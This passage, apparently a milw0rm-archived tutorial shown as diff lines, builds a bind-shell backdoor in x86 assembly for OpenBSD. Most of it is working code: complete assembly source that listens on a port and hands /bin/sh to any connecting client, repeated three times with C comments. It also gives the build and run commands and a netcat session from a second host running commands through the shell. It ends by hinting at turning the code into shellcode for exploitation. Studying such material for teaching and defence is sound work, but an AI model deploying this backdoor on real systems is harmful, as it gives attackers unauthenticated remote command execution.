+   movl $SYS_BIND, %eax         # syscall number sys_bind(104) into eax
+   int $KERN                    # call the kernel
+   addl $12, %esp               # clean stack (# of pushl's-1)*4
+
+   pushl $1                     # pushl backlog (amount of connections)
+   pushl sock                   # push our sock
+   pushl %eax                   # pushl the extra long
+   movl $SYS_LISTEN, %eax       # syscall number sys_listen(106) into eax
+   int $KERN                    # call the kernel
+   addl $8, %esp                # clean stack (# of pushl's-1)*4
+
+   movl $SOCKADDR_IN_SIZE, socklen # put the length into socklen
+   pushl $socklen               # pushl the address of the length
+   pushl $sockaddr_in           # pushl the address of the struct
+   pushl sock                   # pushl our sock we recieved from socket
+   pushl %eax                   # pushl the extra long
+   movl $SYS_ACCEPT, %eax       # syscall number sys_accept(30) into eax
+   int $KERN                    # call the kernel
+   addl $12, %esp               # clean stack (# of pushl's-1)*4
+
+   xorl %eax, %eax              # set eax to 0
+   pushl %eax                   # pushl the return(status) value
+   pushl %eax                   # pushl the extra long
+   movl  $1, %eax               # mov 1 into eax
+   int $0x80                    # call the kernel
+
+When we assemble and run it now it _should_be listening and wont go right to exit, so 
+run it in the background and check if it is listening.
+
+entropy@theo {~/asm} as -gstabs portbind.s -o portbind.o
+
+entropy@theo {~/asm} ld portbind.o -o portbind
+
+entropy@theo {~/asm} ./portbind &
+
+[1] 4414
+
+entropy@theo {~/asm} netstat -na | grep LIST
+
+tcp        0      0  *.6666                 *.*                    LISTEN
+tcp        0      0  127.0.0.1.587          *.*                    LISTEN
+tcp        0      0  127.0.0.1.25           *.*                    LISTEN
+tcp6       0      0  ::1.587                *.*                    LISTEN
+tcp6       0      0  ::1.25                 *.*                    LISTEN
+
+Yep almost done.
+
+
+---[ dup2() and execve()
+
+entropy@theo {~/asm} cat portbind.s
+.section ".note.openbsd.ident", "a"
+        .p2align 2
+        .long   0x8
+        .long   0x4
+        .long   0x1
+        .ascii "OpenBSD\0"
+        .long   0x
+        .p2align 2
+
+.section .rodata
+.equ KERN, 0x80
+.equ SYS_SOCKET, 97
+.equ SYS_BIND, 104
+.equ SYS_LISTEN, 106
+.equ SYS_ACCEPT, 30
+.equ SYS_DUP2, 90
+.equ SYS_EXECVE, 59
+.equ SYS_EXIT,1
+.equ SOCKADDR_IN_SIZE, 16
+.equ PF_INET, 2
+.equ AF_INET, 2
+.equ SOCK_STREAM, 1
+.equ IPPROTO_TCP, 6
+.equ INADDR_ANY, 0
+.equ STDIN, 0
+.equ STDOUT, 1
+.equ STDERR, 2
+.equ PORT, 2586
+
+.section .data
+sockaddr_in:
+sin_len:
+   .byte 0
+sin_family:
+   .byte 0
+sin_port:
+   .word 0
+sin_addr:
+   .long 0
+sin_zero:
+   .long 0,0,0,0,0,0,0,0
+listenSock:
+   .long 0
+acceptSock:
+   .long 0
+socklen:
+   .long 0
+shell:
+   .ascii "/bin/sh\0"
+shelladdr:
+   .long 0
+
+.section .text
+.globl _start
+_start:
+   nop                          # so we can break with gdb, remove later
+   xor %eax, %eax               # set eax to 0
+   pushl $IPPROTO_TCP           # pushl the proto
+   pushl $SOCK_STREAM           # pushl sock_stream
+   pushl $PF_INET               # pushl protocol family
+   pushl %eax                   # pushl extra long
+   movl $SYS_SOCKET, %eax       # syscall number sys_socket(97) into eax
+   int $KERN                    # call the kernel
+   addl $12, %esp               # clean stack (# of pushl's-1)*4
+   movl %eax, listenSock        # save the socket file descriptor
+
+   movl $AF_INET, sin_family    # movl address family value into sin_family
+   movl $INADDR_ANY, sin_addr   # movl inaddr_any to sin_addr
+   movl $PORT, sin_port         # movl port into sin_port
+
+   pushl $SOCKADDR_IN_SIZE      # pushl the size of the struct
+   pushl $sockaddr_in           # pushl the address of the struct
+   pushl listenSock             # pushl our sock we recieved from socket
+   pushl %eax                   # pushl the extra long
+   movl $SYS_BIND, %eax         # syscall number sys_bind(104) into eax
+   int $KERN                    # call the kernel
+   addl $12, %esp               # clean stack (# of pushl's-1)*4
+
+   pushl $1                     # pushl backlog (amount of connections)
+   pushl listenSock             # push our sock
+   pushl %eax                   # pushl the extra long
+   movl $SYS_LISTEN, %eax       # syscall number sys_listen(106) into eax
+   int $KERN                    # call the kernel
+   addl $8, %esp                # clean stack (# of pushl's-1)*4
+
+   movl $SOCKADDR_IN_SIZE, socklen # put the length into socklen
+   pushl $socklen               # pushl the address of the length
+   pushl $sockaddr_in           # pushl the address of the struct
+   pushl listenSock             # pushl our sock we recieved from socket
+   pushl %eax                   # pushl the extra long
+   movl $SYS_ACCEPT, %eax       # syscall number sys_accept(30) into eax
+   int $KERN                    # call the kernel
+   addl $12, %esp               # clean stack (# of pushl's-1)*4
+   movl %eax, acceptSock        # save our accept sock file descriptor
+
+   pushl $STDIN                 # pushl stdin
+   pushl acceptSock             # pushl our accept socket fd
+   pushl %eax                   # pushl extra long
+   movl $SYS_DUP2, %eax         # syscall number sys_dup2(90) into eax
+   int $KERN                    # call the kernel
+   addl $4, %esp                # clean stack (# of pushl's-1)*4
+
+   pushl $STDOUT                # pushl stdout
+   pushl acceptSock             # pushl our accept socket fd
+   pushl %eax                   # pushl extra long
+   movl $SYS_DUP2, %eax         # syscall number sys_dup2(90) into eax
+   int $KERN                    # call the kernel
+   addl $4, %esp                # clean stack (# of pushl's-1)*4
+
+   pushl $STDERR                # pushl stderr
+   pushl acceptSock             # pushl our accept socket fd
+   pushl %eax                   # pushl extra long
+   movl $SYS_DUP2, %eax         # syscall number sys_dup2(90) into eax
+   int $KERN                    # call the kernel
+   addl $4, %esp                # clean stack (# of pushl's-1)*4
+
+   pushl $0                     # pushl the NULL
+   movl $shell, shelladdr       # move the address of shell into shelladdr
+   movl $shelladdr, shelladdr   # move the address of the address into shelladdr
+   pushl $shelladdr             # push the address of the address of the shell
+   pushl $shell                 # push the address of the shell
+   pushl %eax                   # pushl extra long
+   movl $SYS_EXECVE, %eax       # syscall number sys_execve(59) into eax
+   int $KERN                    # call the kernel
+   addl $12, %esp               # clean stack (# of pushl's-1)*4
+
+   xorl %eax, %eax              # set eax to 0
+   pushl %eax                   # pushl the return(status) value
+   pushl %eax                   # pushl the extra long
+   movl  $1, %eax               # mov 1 into eax
+   int $0x80                    # call the kernel
+
+Assembly link and execute, test from another host
+
+entropy@theo {~/asm} as -gstabs portbind.s -o portbind.o
+
+entropy@theo {~/asm} ld portbind.o -o portbind
+
+entropy@theo {~/asm} ./portbind &
+[1] 24363
+
+entropy@redcell {~} perl -e '$|++;while (<>) { print . "\n\x00"; }' | nc theo 6666
+id
+uid=1000(entropy) gid=1000(entropy) groups=1000(entropy), 0(wheel)
+whoami
+entropy
+uname -a
+OpenBSD theo.telegenetic.net 3.7 GENERIC.MP#0 i386
+exit
+
+Assembly on OpenBSD turns out to be really easy if you just take it simple steps at 
+a time, testing as you go with ktrace and gdb. Below is a more commented version of 
+what we just went through showing above the assembly the C that we were calling for 
+easier reading.
+
+entropy@theo {~/asm} cat portbind.s
+.section ".note.openbsd.ident", "a"
+        .p2align 2
+        .long   0x8
+        .long   0x4
+        .long   0x1
+        .ascii "OpenBSD\0"
+        .long   0x
+        .p2align 2
+
+.section .rodata
+.equ KERN, 0x80
+.equ SYS_SOCKET, 97
+.equ SYS_BIND, 104
+.equ SYS_LISTEN, 106
+.equ SYS_ACCEPT, 30
+.equ SYS_DUP2, 90
+.equ SYS_EXECVE, 59
+.equ SYS_EXIT,1
+.equ SOCKADDR_IN_SIZE, 16
+.equ PF_INET, 2
+.equ AF_INET, 2
+.equ SOCK_STREAM, 1
+.equ IPPROTO_TCP, 6
+.equ INADDR_ANY, 0
+.equ STDIN, 0
+.equ STDOUT, 1
+.equ STDERR, 2
+.equ PORT, 2586
+
+.section .data
+sockaddr_in:
+sin_len:
+   .byte 0
+sin_family:
+   .byte 0
+sin_port:
+   .word 0
+sin_addr:
+   .long 0
+sin_zero:
+   .long 0,0,0,0,0,0,0,0
+listenSock:
+   .long 0
+acceptSock:
+   .long 0
+socklen:
+   .long 0
+shell:
+   .ascii "/bin/sh\0"
+shelladdr:
+   .long 0
+
+.section .text
+.globl _start
+_start:
+   nop                          # so we can break with gdb, remove later
+
+   # listenSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
+   xor %eax, %eax               # set eax to 0
+   pushl $IPPROTO_TCP           # pushl the proto
+   pushl $SOCK_STREAM           # pushl sock_stream
+   pushl $PF_INET               # pushl protocol family
+   pushl %eax                   # pushl extra long
+   movl $SYS_SOCKET, %eax       # syscall number sys_socket(97) into eax
+   int $KERN                    # call the kernel
+   addl $12, %esp               # clean stack (# of pushl's-1)*4
+   movl %eax, listenSock        # save the socket file descriptor
+
+   # s.sin_family = AF_INET;
+   # s.sin_addr.s_addr = htonl(INADDR_ANY);
+   # s.sin_port = htons(PORT);
+   movl $AF_INET, sin_family    # movl address family value into sin_family
+   movl $INADDR_ANY, sin_addr   # movl inaddr_any to sin_addr
+   movl $PORT, sin_port         # movl port into sin_port
+
+   # bind(listenSocket, (struct sockaddr *)&s, sizeof(s))
+   pushl $SOCKADDR_IN_SIZE      # pushl the size of the struct
+   pushl $sockaddr_in           # pushl the address of the struct
+   pushl listenSock             # pushl our sock we recieved from socket
+   pushl %eax                   # pushl the extra long
+   movl $SYS_BIND, %eax         # syscall number sys_bind(104) into eax
+   int $KERN                    # call the kernel
+   addl $12, %esp               # clean stack (# of pushl's-1)*4
+
+   # listen(listenSocket, 1);
+   pushl $1                     # pushl backlog (amount of connections)
+   pushl listenSock             # push our sock
+   pushl %eax                   # pushl the extra long
+   movl $SYS_LISTEN, %eax       # syscall number sys_listen(106) into eax
+   int $KERN                    # call the kernel
+   addl $8, %esp                # clean stack (# of pushl's-1)*4
+
+   # acceptSocket = accept(listenSocket, (struct sockaddr *)&s, &len);
+   movl $SOCKADDR_IN_SIZE, socklen # put the length into socklen
+   pushl $socklen               # pushl the address of the length
+   pushl $sockaddr_in           # pushl the address of the struct
+   pushl listenSock             # pushl our sock we recieved from socket
+   pushl %eax                   # pushl the extra long
+   movl $SYS_ACCEPT, %eax       # syscall number sys_accept(30) into eax
+   int $KERN                    # call the kernel
+   addl $12, %esp               # clean stack (# of pushl's-1)*4
+   movl %eax, acceptSock        # save our accept sock file descriptor
+
+   # dup2(acceptSocket, STDIN);
+   pushl $STDIN                 # pushl stdin
+   pushl acceptSock             # pushl our accept socket fd
+   pushl %eax                   # pushl extra long
+   movl $SYS_DUP2, %eax         # syscall number sys_dup2(90) into eax
+   int $KERN                    # call the kernel
+   addl $4, %esp                # clean stack (# of pushl's-1)*4
+
+   # dup2(acceptSocket, STDOUT);
+   pushl $STDOUT                # pushl stdout
+   pushl acceptSock             # pushl our accept socket fd
+   pushl %eax                   # pushl extra long
+   movl $SYS_DUP2, %eax         # syscall number sys_dup2(90) into eax
+   int $KERN                    # call the kernel
+   addl $4, %esp                # clean stack (# of pushl's-1)*4
+
+   # dup2(acceptSocket, STDERR);
+   pushl $STDERR                # pushl stderr
+   pushl acceptSock             # pushl our accept socket fd
+   pushl %eax                   # pushl extra long
+   movl $SYS_DUP2, %eax         # syscall number sys_dup2(90) into eax
+   int $KERN                    # call the kernel
+   addl $4, %esp                # clean stack (# of pushl's-1)*4
+
+   # shell[0] = "/bin/sh";
+   # shell[1] = NULL;
+   # execve(shell[0], shell, NULL);
+   pushl $0                     # pushl the NULL
+   movl $shell, shelladdr       # move the address of shell into shelladdr
+   movl $shelladdr, shelladdr   # move the address of the address into shelladdr
+   pushl $shelladdr             # push the address of the address of the shell
+   pushl $shell                 # push the address of the shell
+   pushl %eax                   # pushl extra long
+   movl $SYS_EXECVE, %eax       # syscall number sys_execve(59) into eax
+   int $KERN                    # call the kernel
+   addl $12, %esp               # clean stack (# of pushl's-1)*4
+
+   # exit(0);
+   xorl %eax, %eax              # set eax to 0
+   pushl %eax                   # pushl the return(status) value
+   pushl %eax                   # pushl the extra long
+   movl  $1, %eax               # mov 1 into eax
+   int $0x80                    # call the kernel
+
+Now if we could only get the note section to have no nulls, load this into memory 
+somewhere have a bit of fun with the .got and .plt, or exec a retf to the .text 
+seg we may just be able to have some fun times....
+
+# milw0rm.com [2006-04-08]
